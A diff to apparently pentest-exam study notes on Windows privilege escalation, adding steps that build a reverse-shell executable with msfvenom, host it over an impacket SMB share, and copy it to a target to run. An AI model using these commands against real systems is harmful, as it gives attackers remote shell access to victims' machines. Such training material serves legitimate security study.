@@ -6,6 +6,30 @@ A couple of golden resources that you need to be aware of and should be referenc
 - [PayloadAllThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
 - [Sushant's Blog](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)
 
+
+### Reverse Shell - General Method
+--------------------------------------
+
+1. Generate a reverse shell executable through any standard payload 
+
+> **msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe**
+
+
+As a next step, host this through a simple Python Server or through SMB share. You know Python server, here is the command for SMB share
+
+> **sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .**
+
+Note that the SMB server has to be set up in the same folder where the reverse.exe is (just like python server)
+
+On the Target Windows machine you need to run the following command
+
+> **copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe**
+
+Replace 10.10.10.10 with whatever IP the attach machine has.
+
+And then run the reverse.exe file on the victim machine
+
+
 ### Escalation Path 1 - Kernel Exploits
 ----------------------------------------
 
@@ -27,3 +51,7 @@ https://github.com/SecWiki/windows-kernel-exploits
 
 4. See the methodology to get an escalated session and escalate privileges
 
+
+
+
+### Escalation Path 2 - 
